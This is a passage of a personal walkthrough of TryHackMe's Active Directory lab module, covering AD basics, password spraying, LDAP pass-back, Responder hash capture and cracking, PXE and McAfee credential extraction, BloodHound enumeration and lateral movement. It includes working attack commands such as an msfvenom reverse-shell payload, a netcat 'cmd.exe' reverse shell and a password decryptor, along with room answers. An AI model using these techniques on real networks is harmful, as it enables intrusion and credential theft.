# Active Directory [TryHackMe Module]

<sup>This write-up covers the entire module of Active Directory, that can be found in the learning paths _Offensive Pentest_ and _Red Teaming_. This module is a walkthrough, I will explore it as much as possible.</sup>

## Active Directory Basics

First let's log into the machine via `xfreerdp`:

```shell
xfreerdp /u:Administrator@THM /p:Password321 /v:10.10.185.134 /cert:ignore +clipboard
```

- In a Windows domain, credentials are stored in a centralised repository called...
- __Active Directory__

- The server in charge of running the Active Directory services is called...
- __Domain Controller__

- Which group normally administrates all computers and resources in a domain?
- __Domain Admins__

- What would be the name of the machine account associated with a machine named TOM-PC?
- __TOM-PC$__

- Suppose our company creates a new department for Quality Assurance. What type of containers should we use to group all Quality Assurance users so that policies can be applied consistently to them?
- __Organizational Units__

Let's open the search in the Windows machine and type _Active Directory Users and Computers_. Open it.

We have to remove the Research and Development OU as per the chart given to us, so go to the __View__ dropdown, then __Advanced Features__, right click the Research and Development OU in the tree to the left, click __Properties__.

You should see __Object__ tab and when you go to it, uncheck the `Protect object from accidental deletion` checkbox. Click OK to save settings and try deleting again. 

Now let's see which users don't match with our organizational chart. Sales department seems to crowded as there are two extra employees, that aren't in the chart: Christine and Robert. Let's delete them too. 

The control of Sales OU should be delegated to Phillip in the IT. Right click Sales OU and click __Delegate Control__, press `Next` in the wizard and type `Phillip` in the prompt for names. Once it finds it click `Next` again. In the tasks list, check only `Reset user passwords and force password change at next logon`. Then `Next` and `Finish`. 

Now let's use Phillip's account to try and reset Sophie's password:

```shell
xfreerdp /u:Phillip@THM /p:Claire2008 /v:10.10.185.134 /cert:ignore +clipboard
```

Once we're in, to reset Sophie's password to the one of our choice open PowerShell and type the following:

```powershell
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

I chose `Pass!@#$1234` as Sophie's new password. Now we need to force the user to change password at logon:

```powershell
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
```

Now let's log in as Sophie's user with new password:

```shell
xfreerdp /u:Sophie@THM /p:"Pass!@#$1234" /v:10.10.185.134 /cert:ignore +clipboard
```

Change the password and capture the flag!

- The process of granting privileges to a user over some OU or other AD Object is called...
- __Delegation__

This time we are going to organize computers so, let's go back to the administrator account via `xfreerdp`. Navigate back to Active Directory Users and Computers, right click `thm.local` in the tree, then __New__ and __Organizational Unit__. Name the unit Workstation and do it again for Servers. From Computers OU drag and drop Laptops and Computers to Workstations OU and Servers to Servers OU. 

- After organising the available computers, how many ended up in the Workstations OU? 
- __7__

- Is it recommendable to create separate OUs for Servers and Workstations? (yay/nay)
- __yay__

Now let's log back into the machine as Administrator user. Search for and navigate to __Group Policy Management__ through Start menu. Create a new GPO called "Restrict Control Panel Access". Open it for editing and under _User Configuration_ --> _Policies_ -->  _Administrative Templates_ --> _Control Panel_ find __Prohibit Access to Control Panel and PC Settings__. Double click it and enable it. 

Now we can link this GPO to OUs. Just drag and drop the GPO to all OUs under THM that aren't IT. 

Now let's create a new GPO and name it "Auto Lock Screen", edit it in the same way only look into _Computer Configuration_ --> _Policies_ --> _Windows Settings_ --> _Security Settings_ --> _Local Policies_ --> _Security Options_ and choose __Interactive logon: Machine inactivity limit__.

Set the limit to 5 minutes (or 300 seconds) and apply this policy to the entire domain `thm.local` by dragging it right under it in the tree. 

Now we can log into the machine as user Mark and check if both policies work:

```shell
xfreerdp /u:Mark@THM /p:"M4rk3t1ng.21" /v:10.10.35.36 /cert:ignore +clipboard
```

- What is the name of the network share used to distribute GPOs to domain machines?
- __sysvol__

- Can a GPO be used to apply settings to users and computers? (yay/nay)
- __yay__

- Will a current version of Windows use NetNTLM as the preferred authentication protocol by default? (yay/nay)
- __nay__

- When referring to Kerberos, what type of ticket allows us to request further tickets known as TGS?
- __Ticket Granting Ticket__

- When using NetNTLM, is a user's password transmitted over the network at any point? (yay/nay)
- __nay__

- What is a group of Windows domains that share the same namespace called?
- __Tree__

- What should be configured between two domains for a user in Domain A to access a resource in Domain B?
- __A Trust Relationship__

## Breaching Active Directory

### Configure DNS

First, let's start the VPN for this network in the background (mine's name was `breachingad.ovpn`):

```shell
sudo nohup openvpn --config breachingad.ovpn > /dev/null 2>&1 &
```

Then let's configure DNS for this connection specifically:

```
└─$ nmcli connection show
NAME                UUID                                  TYPE      DEVICE
Wired connection 1  da0d3c10-0411-4b35-ac3a-8e1dddab43a6  ethernet  eth1
breachad            2ef21389-d21b-41e8-868f-7893f446ee65  tun       breachad
```

This `breachad` connection is what we need to configure DNS for:

```
sudo nmcli connection modify "breachad" ipv4.dns "10.200.9.101 1.1.1.1"
``` 

The first DNS server `10.200.9.101` is the IPv4 address of the Domain Controller (THMDC) on this network. The second DNS server address `1.1.1.1` is cloudflare DNS for the purposes of having internet on this machine.

```
sudo nmcli connection modify "breachad" ipv4.ignore-auto-dns yes
```

The purpose of the above command is to not overwrite DNS we gave this connection with automatic configuration of DNS addresses. Now let's turn the connection on:

```
sudo nmcli connection up "breachad"
```

Now let's verify our DNS configuration for this connection is correct:

```
nmcli dev show breachad | grep DNS
```

If the output is this:

```
IP4.DNS[1]:                             10.200.9.101
IP4.DNS[2]:                             1.1.1.1
```

We should be good to go. 

```
nslookup za.tryhackme.com 10.200.9.101
```

If it doesn't resolve, try:

```
sudo ip route add 10.200.9.101 dev breachad
```

And then try `nslookup` again.

Here's a [script](https://github.com/gremlin-0x/AD_module_dns_config) that does this more reliably and is supposed to work with next rooms as well.

- What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?
- __haveibeenpwnd__

In this task the room just provides us with most of what we need to breach the endpoint, including the endpoint itself. In real scenario, we would need to perform enumeration to find out about `http://ntlmauth.za.tryhackme.com` or any other service really, as password spraying attack can be performed against SMB, RDP , WinRM, Windows Login, etc as all of these could be using NTLM for various reasons and purposes. The idea is to find a vulnerable endpoint, perform a password spraying attack with a list of usernames and a password to find out if any user has a weak password we could then try and use against endpoints with a higher level protection (say, Kerberos).

Download and unzip the file tasks:

```shell
unzip passwordsprayer-1111222233334444.zip
```

First, let's define what __password spraying__ means. To anyone familiar with password __brute forcing__, password spraying is that, only reversed, meaning we are trying the _same_ password with a _variety_ of usernames.

<mark>_Clarifying the room_</mark>: __(a.)__ this room provides a password spraying python script as well as the username list to use with it. These are usually collected via OSINT or Phishing campaigns and in this particular case `Changeme123` is often a password IT staff uses to set for the employees within a company to gently remind them that it needs changing, which often they forget to do. __(b.)__ The room doesn't quite explain how the script works, which is why we will do it:

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    count = 0
    for user in self.users:
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

The method iterates over all usernames in the `self.users` list and attempts to authenticate using the provided password with NTLM authentication (`HttpNtlmAuth(self.fqdn + "\\" + user, password)`). Successful Login: If the HTTP response is `200`, the credential pair (username and password) is considered valid, and it prints out the result. Failed Login: If the response is `401`, the login failed, and if verbose mode is enabled, it prints a failure message. `count`: Keeps track of how many valid credential pairs were found.

The usage:

```shell
python3 ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

-u or --userfile: The path to the file containing the list of usernames.

-f or --fqdn: The Fully Qualified Domain Name (FQDN) of the target.

-p or --password: The password to be used in the password spraying attack.

-a or --attackurl: The URL to attack.

Now let's fill this in with our own data.

```shell
python3 ntlm_passwordspray.py -u usernames.txt -p "Changeme123" -f "za.tryhackme.com" -a "http://ntlmauth.za.tryhackme.com"
```

This renders the following valid credential pairs:

```
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```

- What is the name of the challenge-response authentication mechanism that uses NTLM?
- __NetNTLM__

- What is the username of the third valid credential pair found by the password spraying script?
- __gordon.stevens__

- How many valid credentials pairs were found by the password spraying script?
- __4__

- What is the message displayed by the web application when authenticating with a valid credential pair?
- __Hello World__

Now we will practice LDAP pass-back attacks on a printer connected to this network `printer.za.tryhackme.com`. LDAP authentication is sometimes used to integrate applications with Active Directory. In an LDAP authentication scenario, a third-party application (e.g., GitLab, Jenkins, VPN, etc.) uses a pair of AD credentials (usually a service account with bind permissions) to authenticate against the LDAP server. The application queries the AD database using these credentials to verify user authentication when someone attempts to log in.

The service uses a bind operation to authenticate itself to the LDAP server. The bind is typically done using a service account with enough privileges to perform lookups on AD users. The application then sends the user's username and password to the LDAP server, which verifies the user against the AD directory.

AD credentials used by the application to query LDAP are crucial. The permissions and scope of these credentials dictate how much data can be accessed. For example, an application might be limited to reading user attributes, but if the credentials are over-privileged, they could access more sensitive data.

In this case a network device is configured to use LDAP for authentication. However, it often has default or weak configurations, which can be exploited. The printer attempts to authenticate against an LDAP server (in this case Active Directory). 

In the LDAP Pass-back attack, the attacker modifies the printer's LDAP configuration to point to their own machine's IP address. When the printer attempts to test the LDAP connection, it connects to the rogue server. This connection is intercepted, and the attacker can capture the LDAP credentials being transmitted by the printer to authenticate with the LDAP server. 

Let's follow the steps:

```shell
firefox http://printer.za.tryhackme.com/settings.aspx
``` 

We don't have the password for this one, however upon testing settings, it still sends request to the specified IP address. We can input our IP of the VPN interface `breachad` and see what happens:

```shell
ip a | grep breachad
nc -lvnp 339
```

Here's the output:

```
listening on [any] 339 ...
connect to [10.50.8.21] from (UNKNOWN) [10.200.9.201] 49804
0Dc;

x
 objectclass0supportedCapabilities
```

Let's move on to hosting a rogue LDAP server on our machine, to make use of this vulnerability:

```shell
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

To downgrade our LDAP server's security, we need to create an `olcSaslSecProps.ldif` file with the following contents:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:
    - olcSaslSecProps: Specifies the SASL security properties
    - noanonymous: Disables mechanisms that support anonymous login
    - minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

Now let's use it to patch the LDAP server:

```shell
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

To test our configuration:

```shell
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

The output should be:

```
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

So let's repeat the following sequence and fill in the test settings for the printer:

```shell
ip a | grep breachad
nc -lvnp 339
firefox http://printer.za.tryhackme.com/settings.aspx
```

Fill in the creds and then:

```shell
sudo tcpdump -SX -i breachad tcp port 389
```

The result:

```
12:23:11.951296 IP 10.200.9.201.54858 > kali.ldap: Flags [P.], seq 2832526348:2832526413, ack 3299128608, win 1027, length 65
        0x0000:  4500 0069 72ca 4000 7f06 61ed 0ac8 09c9  E..ir.@...a.....
        0x0010:  0a32 0815 d64a 0185 a8d4 ec0c c4a4 b520  .2...J..........
        0x0020:  5018 0403 cc9d 0000 3084 0000 003b 0201  P.......0....;..
        0x0030:  0760 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..{*********
        0x0060:  6461 7070 6173 7331 40                   ********}
12:23:11.951319 IP kali.ldap > 10.200.9.201.54858: Flags [.], ack 2832526413, win 502, length 0
```

This task focuses on attacking NetNTLM authentication with SMB in a Windows network, leveraging Responder to perform a Man-in-the-Middle (MitM) attack and intercept SMB authentication requests. The goal is to gain access to NetNTLM hashes which can be cracked offline, or perform SMB relay attacks to gain access to networked resources.

SMB is a protocol used by Windows for sharing files, printers, and other network services. It is heavily used for network file sharing and remote administration. SMB relies on NetNTLM authentication (a variant of NTLM used in SMB communications) to verify the identity of clients making requests to the server. Older SMB versions (like SMBv1) have security weaknesses, such as NTLM relay attacks and SMB-signing vulnerabilities, which can be exploited by attackers. 

Responder is a tool that allows attackers to perform MitM attacks by poisoning LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and WPAD (Web Proxy Auto-Discovery Protocol) requests on the network.These protocols allow hosts on the same local network to discover each other, and by poisoning these requests, an attacker can intercept SMB authentication attempts.

When a client (e.g., a workstation or service) tries to authenticate using SMB, it will send an NTLM challenge to the server. If an attacker sets up a rogue device (using Responder), it can intercept the authentication challenge and the corresponding NetNTLM hash associated with the challenge. The NetNTLM hash (which contains the password) can then be cracked offline, either manually or using tools like Hashcat, which is a fast password-cracking tool.

Let's follow the steps:

```shell
sudo responder -I breachad
```

It so happens that this task simulates an authentication request that runs once in 30 minutes, so we will need to wait for it for quite a bit to receive it. 

After a bit of waiting, here's the output it showed:

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.200.9.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:76d998cefda390b1:254A1AA [...] F9757F:01010000 [...] 000000
```

We save the entire response (`svcFileCopy` and onwards) to a file `hash.txt`. Now let's download the task file and crack it using the password list provided:

```shell
hashcat -m 5600 hash.txt passwords.txt --force
```

The output:

```
SVCFILECOPY::ZA:76d998cefda390b1:254a1aa38 [...] d7f9757f:010100000 [...] 000000:{***********}
```

We have the password!

This task is focusing on exploiting misconfigurations in Microsoft's MDT and SCCM deployment tools, which are commonly used is large organizations for operating system deployment and patch management. 

MDT (Microsoft Deployment Toolkit): This tool automates the deployment of Microsoft operating systems. It's often used in conjunction with SCCM (System Center Configuration Manager) to manage software, updates, and system configurations.

PXE Boot is a method used in large organizations to deploy operating systems over the network. By booting from a network server, new devices can load and install an OS without the need for physical installation media like DVDs or USB drives.

Attackers can exploit misconfigurations in the PXE boot process to recover or inject credentials that were used during the OS deployment process. For example, attackers can recover credentials from the `bootstrap.ini` file, which contains sensitive AD account information used during deployment.

TFTP is used to download configuration files and boot images from the MDT server. Once the BCD (Boot Configuration Data) file is downloaded, attackers can extract the details of the PXE boot image (WIM file). The credentials stored in the bootstrap.ini file can then be retrieved, which may include domain administrator credentials or service account credentials used during the unattended installation.

Let's find the IP of the MDT server:

```
└─$ nslookup thmmdt.za.tryhackme.com
Server:         10.200.9.101
Address:        10.200.9.101#53

Name:   thmmdt.za.tryhackme.com
Address: 10.200.9.202
```

Let's connect to the Jump Box using the provided password:

```shell
ssh thm@THMJMP1.za.tryhackme.com
```

Once inside, they navigate to the `Documents` directory, create a working folder (using their username), and copy the `powerpxe` tool:

```cmd
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir gremlin
C:\Users\THM\Documents> copy C:\powerpxe gremlin\
C:\Users\THM\Documents\> cd gremlin
```

This setup allows us to run PowerPXE, a PowerShell-based tool for extracting credentials from PXE boot images.

Retrieve the BCD file using TFTP. The BCD file contains the PXE boot c
onfigurations, including which boot image to use for different system architectures:

```cmd
powershell -c 'tftp -i 10.200.9.202 GET "\Tmp\x64{51EEF035-C878-4BF3-8464-01DC62BC0237}.bcd" conf.bcd'
```

Once downloaded, use PowerPXE to extract information about the WIM (Windows Imaging Format) boot image:

```cmd
C\Users\THM\Documents\gremlin\> powershell -executionpolicy bypass
```

```powershell
PS C:\Users\THM\Documents\Am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\Am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\Am0> Get-WimFile -bcdFile $BCDFile
```

The output should look like this:

```
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
```

This is a PXE Boot Image location. We have to use `tftp` again to retrieve the image in question:

```powershell
tftp -i 10.200.9.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

Finally, they extract credentials from `pxeboot.wim`:

```powershell
Get-FindCredentials -WimFile pxeboot.wim
```

The output:

```
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = ******
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = ***************
```

This task focuses on retrieving Active Directory (AD) credentials stored in a centrally deployed application’s configuration files. Specifically, we target McAfee Enterprise Endpoint Security, which stores authentication details in an SQLite database (`ma.db`).

Many enterprise applications require domain authentication during installation and execution. These applications often store credentials in configuration files, databases, or registry keys. If an attacker gains access to such files, they may recover plaintext or encrypted credentials.

We need to log into the Jump Box again:

```shell
ssh thm@THMJMP1.za.tryhackme.com
```

From there we change directory to:

```cmd
cd C:\ProgramData\McAfee\Agent\DB
dir
```

There's `ma.db` file there. Let's copy it to our local machine with `scp`:

```shell
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

Now we need to read the database with `sqlitebrowser`

```shell
sqlitebrowser ma.db
```

From there we navigate to the __Browse Data__ tab and check __`AGENT_REPOSITORIES`__ table:

![AGENT_REPOSITORIES](screenshot.png "sqlitebrowser ma.db table named AGENT_REPOSITORIES")

For me at least, nothing is visible at this point, so I navigated to __Execute SQL__ tab and wrote:

```sql
SELECT * FROM AGENT_REPOSITORIES
```

Now there's some credentials. Correct the `sql` query:

```sql
SELECT AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES
```

This delivers exactly what we need, let's save the password hash.

This python script was buggy for me. It's written for `python2`, but the library it requires `pycryptodome`, when installed with `pip` in the `virtualenv`, doesn't work with `python2` so I debugged the entire code and upgraded it to `python3`. Please if you're running into errors, save yourself some time:

```python3
#!/usr/bin/env python3
# Info:
#    McAfee Sitelist.xml password decryption tool
#    Jerome Nokin (@funoverip) - Feb 2016
#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
#
# Quick howto:
#    Search for the XML element <Password Encrypted="1">...</Password>,
#    and paste the content as argument.
#
###########################################################################

import sys
import base64
import binascii
from Crypto.Cipher import DES3
from Crypto.Hash import SHA

# hardcoded XOR key
KEY = binascii.unhexlify("12150F10111C1A060A1F1B1817160519")

def sitelist_xor(xs):
    return bytes(c ^ KEY[i % 16] for i, c in enumerate(xs))

def des3_ecb_decrypt(data):
    # hardcoded 3DES key
    key = SHA.new(b'<!@#$%^>').digest() + b"\x00\x00\x00\x00"
    # decrypt
    des3 = DES3.new(key, DES3.MODE_ECB)
    decrypted = des3.decrypt(data)
    # quick hack to ignore padding
    return decrypted[0:decrypted.find(b'\x00')].decode() or "<empty>"


if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage:   %s <base64 passwd>" % sys.argv[0])
        print("Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='" % sys.argv[0])
        sys.exit(0)

    # read arg
    encrypted_password = base64.b64decode(sys.argv[1])
    # decrypt
    password = des3_ecb_decrypt(sitelist_xor(encrypted_password))
    # print out
    print("Crypted password   : %s" % sys.argv[1])
    print("Decrypted password : %s" % password)

    sys.exit(0)
```

Now `virtualenv`:

```
python3 -m virtualenv venv
source venv/bin/activate
pip install pycryptodome
python3 mcafee_sitelist_pwd_decrypt.py <the_password_hash_recovered>
```

The output should be:

```
Crypted password   : [...]
Decrypted password : [...]
```

## Enumerating Active Directory

For this room we will need to download the `adenumeration.ovpn` file from TryHackMe's [Access page](https://tryhackme.com/access) and once we have it use [this script](https://github.com/gremlin-0x/AD_module_dns_config) to connect to the network:

```
./network.sh adenumeration 10.200.56.101
```

After that let's visit the site as the room instructs and get the credentials:

```
firefox http://distributor.za.tryhackme.com/creds
``` 

Output:

> Your credentials have been generated: Username: p[...]d Password: S[...]7

Now let's use `ssh` to log into the Jump Box and verify our credentials:

```
ssh za.tryhackme.com\\p[******]d@thmjmp1.za.tryhackme.com
```

And we're in. 

This section is talking about how to use stolen credentials (username and password) to access network resources without fully logging into a domain-joined machine. Let’s break it down step by step. 

In Active Directory (AD) attacks, attackers frequently obtain credentials without hacking into a domain-joined machine. Examples:

- Finding credentials in Group Policy Preferences (GPP)
- Extracting credentials from memory using Mimikatz
- Finding cleartext credentials in SYSVOL or network shares
- Extracting credentials from an unencrypted password manager

Once you get a username and password, the challenge is: How do you use them if you don’t have a machine inside the domain? That’s where Runas.exe comes in.

What native Windows binary allows us to inject credentials legitimately into memory?
- __runas.exe__

What parameter option of the runas binary will ensure that the injected credentials are used for all network connections?
- __/netonly__

What network folder on a domain controller is accessible by any authenticated AD account and stores GPO information?
- __SYSVOL__

When performing dir \\za.tryhackme.com\SYSVOL, what type of authentication is performed by default?
- __Kerberos Authentication__

First I am going to RDP into this machine:

```
xfreerdp /v:10.200.56.248 /u:za.tryhackme.com\\p[******]d /p:S[******]7 /cert:ignore
```

This task is introducing Microsoft Management Console (MMC) as a graphical tool to enumerate Active Directory (AD). This is different from command-line or PowerShell-based enumeration methods. Let’s break it down.

Most real-world sysadmins use GUI-based tools like MMC instead of command-line methods. RSAT (Remote Server Administration Tools) provides Active Directory management snap-ins to explore AD objects. This is a legitimate tool, making it less suspicious in a Red Team scenario compared to running PowerShell scripts.

Now we just need to follow the room's instrucitons to run MMC: `Win + r > mmc`. 

- Click **File** -> **Add/Remove Snap-in**
- Select and **Add** all three Active Directory Snap-ins
- Click through any errors and warnings
- Right-click on **Active Directory Domains and Trusts** and select **Change Forest**
- Enter za.tryhackme.com as the **Root domain** and Click OK
- Right-click on **Active Directory Sites and Services** and select **Change Forest**
- Enter za.tryhackme.com as the **Root domain** and Click OK
- Right-click on **Active Directory Users and Computers** and select **Change Domain**
- Enter za.tryhackme.com as the **Domain** and Click OK
- Left-click on **Active Directory Users and Computers** in the left-hand pane
- Click on **View** -> **Advanced Features**

Now that our MMC is authenticated against the target domain, we can start looking through its entire structure. Let's expand the ZA domain to see the users and computers configured in it and answer questions:

How many Computer objects are part of the Servers OU?
- __2__

How many Computer objects are part of the Workstations OU?
- __1__

How many departments (Organisational Units) does this organisation consist of?
- __7__

How many Admin tiers does this organisation have?
- __3__

What is the value of the flag stored in the description attribute of the t0_tinus.green account?
- [<mark>__REDACTED__</mark>]

Now let's get back to our SSH prompt from before to try and enumerate everything from `cmd`.

- Apart from the Domain Users group, what other group is the aaron.harris account a member of?

```
za\p[******]d@THMJMP1 C:\Users\p{******]d>net user aaron.harris /domain

Local Group Memberships
Global Group memberships     *Domain Users         *Internet Access
The command completed successfully.
```
- __Internet Access__

Is the Guest account active? (Yay,Nay)

```
net user Guest /domain

Country/region code          000 (System Default)
Account active               No
Account expires              Never
```
- __Nay__

How many accounts are a member of the Tier 1 Admins group?

```
za\p[******]d@THMJMP1 C:\Users\p[******]d>net group "Tier 1 Admins" /domain
The request will be processed at a domain controller for domain za.tryhackme.com.

Group name     Tier 1 Admins
Comment

Members

-------------------------------------------------------------------------------
t1_arthur.tyler          t1_gary.moss             t1_henry.miller
t1_jill.wallis           t1_joel.stephenson       t1_marian.yates
t1_rosie.bryant
The command completed successfully.
```
- __7__

What is the account lockout duration of the current password policy in minutes?

```
za\p ... d>net accounts /domain
The request will be processed at a domain controller for domain za.tryhackme.com.

Force user logoff how long after time expires?:       Never
...
Lockout duration (minutes):                           30
...
The command completed successfully.
```
- __30__

Now let's convert this shell into PowerShell:

```
powershell -executionpolicy bypass
```

Now let's enumerate this domain in PowerShell and answer questions:

What is the value of the Title attribute of Beth Nolan (beth.nolan)?

```
Get-ADUser -Identity beth.nolan -Server za.tryhackme.com -Properties Title

Title                                : Senior
```
- __Senior__

What is the value of the DistinguishedName attribute of Annette Manning (annette.manning)?

```
Get-ADUser -Identity beth.nolan -Server za.tryhackme.com -Properties DistinguishedName

DistinguishedName : CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com
```

- __DistinguishedName : CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com__

When was the Tier 2 Admins group created?

```
Get-ADGroup -Identity "Tier 2 Admins" -Properties whenCreated


DistinguishedName : CN=Tier 2 Admins,OU=Groups,DC=za,DC=tryhackme,DC=com
GroupCategory     : Security
GroupScope        : Global
Name              : Tier 2 Admins
ObjectClass       : group
ObjectGUID        : 6edab731-c305-4959-bd34-4ca1eefe2b3f
SamAccountName    : Tier 2 Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-1104
whenCreated       : 2/24/2022 10:04:41 PM
```
- __2/24/2022 10:04:41 PM__

What is the value of the SID attribute of the Enterprise Admins group?

```
Get-ADGroup -Identity "Enterprise Admins" -Properties SID


DistinguishedName : CN=Enterprise Admins,CN=Users,DC=za,DC=tryhackme,DC=com
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : 93846b04-25b9-4915-baca-e98cce4541c6
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-519
```
- __S-1-5-21-3330634377-1326264276-632209373-519__

Which container is used to store deleted AD objects?

```
Get-ADDomain -Server za.tryhackme.com

DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=com
```
- __CN=Deleted Objects,DC=za,DC=tryhackme,DC=com__

This section introduces BloodHound, one of the most powerful tools for Active Directory enumeration and attack path analysis. Here's a breakdown of how it works and why it's so effective.

Traditional AD defense relies on lists (e.g., list of Domain Admins, list of computers). Attackers think in graphs, finding hidden relationships between users, groups, and permissions. BloodHound visualizes AD as a graph, showing potential attack paths that may not be obvious from lists. Red teamers use BloodHound to plan and execute attacks efficiently. Blue teamers now also use it to find misconfigurations before attackers do.

Let's get back to our PowerShell session and start using SharpHound to enumerate AD information for Bloodhound:

```powershell
copy C:\Tools\Sharphound.exe ~\Documents\
./SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```

It will take a minute. When it's done, run:

```powershell
dir
```

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/8/2025  12:36 AM         120536 20250308003651_BloodHound.zip
-a----        3/16/2022   5:19 PM         906752 Sharphound.exe
-a----         3/8/2025  12:36 AM         359470 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZm
                                                 RiOWY1.bin
```

Now let's get these newly created files to our linux machine:

```shell
scp za.tryhackme.com\\p[...]d@thmjmp1.za.tryhackme.com:C:/Users/p[...]d/Documents/20250308003651_BloodHound.zip .
20250308003651_BloodHound.zip                             100%  118KB 117.7KB/s   00:01
```

Before we can start `bloodhound` we need to start `neo4j`:

```shell
sudo neo4j console
```

In a different terminal tab, we run:

```shell
bloodhound --no-sandbox
```

Let's follow the steps outlined in the room and answer the questions:

What command can be used to execute Sharphound.exe and request that it recovers Session information only from the za.tryhackme.com domain without touching domain controllers?
- __`Sharphound.exe --CollectionMethods Session --Domain za.tryhackme.com --ExcludeDCs`__

Apart from the krbtgt account, how many other accounts are potentially kerberoastable?
- __4__

How many machines do members of the Tier 1 Admins group have administrative access to?
- __2__

How many users are members of the Tier 2 Admins group?
- __15__

## Lateral Movement and Pivoting

Having downloaded the necessary VPN configuration file, use the [script](https://github.com/gremlin-0x/AD_module_dns_config) once again to connect to the network and configure DNS:

```shell
./network.sh lateralmovementandpivoting.ovpn 10.200.71.101
```

Now let's visit the credential distributor on this network and get credentials:

```shell
firefox http://distributor.za.tryhackme.com/creds
```

The credentials are:

```
 Your credentials have been generated: Username: tony.holland Password: Mhvn2334 
```

Okay, let's try to login with these credentials using SSH:

```
ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com
```

And we're in:

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

za\tony.holland@THMJMP2 C:\Users\tony.holland>
```

Lateral movement is the technique attackers use to move across a network after gaining an initial foothold. Instead of staying on the first compromised machine, they navigate through other systems to escalate privileges, bypass security measures, and reach valuable targets.

Once an attacker has valid credentials on a target machine, they need a way to execute commands remotely. Different methods have different requirements, detection risks, and benefits.

Attackers use __PsExec__, __WinRM__, __remote service creation__, and __scheduled tasks__ to execute commands remotely. __WinRM__ is stealthier than __PsExec__ but still logs activity. `sc.exe` (__remote service creation__) and `schtasks.exe` (__scheduled tasks__) are great for persistence. Defenders should monitor logs, restrict remote execution, and disable unnecessary services.

Now let's follow the steps. We have some credentials captured and are trying to move to a different machine from this Jump Box with these credentials. Let's start with `sc.exe` or remote service creation method:

```shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.56 LPORT=9233 -o sc_myservice.exe
```

This generates a reverse shell payload as an `exe` file to upload to a Windows machine. This is exactly what we are going to do using `smbclient` and our captured credentials:

```shell
smbclient -c 'put sc_myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

The output:

```
putting file sc_myservice.exe as \sc_myservice.exe (30.2 kb/s) (average 30.2 kb/s)
```

Now let's set up a listener in the `metasploit` console:

```shell
msfconsole -qx "use exploit/multi/handler; set lhost 10.50.65.56; set lport 9233; set payload windows/shell/reverse_tcp; run;
```

After this is done, in our `ssh` session with `tony.holland`'s account, we need to run another reverse shell with `t1_leonard.summers`' access token:

```cmd
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.65.56 4443"
```
